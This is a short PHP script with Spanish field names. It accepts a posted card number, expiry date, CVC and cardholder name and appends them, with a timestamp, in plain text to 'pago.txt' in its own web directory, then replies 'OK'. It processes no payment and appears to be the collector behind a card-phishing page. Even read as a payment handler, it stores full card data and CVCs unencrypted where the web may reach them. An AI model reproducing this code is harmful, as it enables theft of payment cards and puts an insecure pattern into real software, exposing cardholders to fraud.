<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = [
        'tarjeta' => $_POST['tarjeta'] ?? '',
        'expiracion' => $_POST['expiracion'] ?? '',
        'cvc' => $_POST['cvc'] ?? '',
        'nombre' => $_POST['nombre'] ?? '',
        'fecha' => date('Y-m-d H:i:s')
    ];
    $line = implode(' | ', $data) . PHP_EOL;
    file_put_contents(__DIR__ . '/pago.txt', $line, FILE_APPEND);
    echo 'OK';
}
?>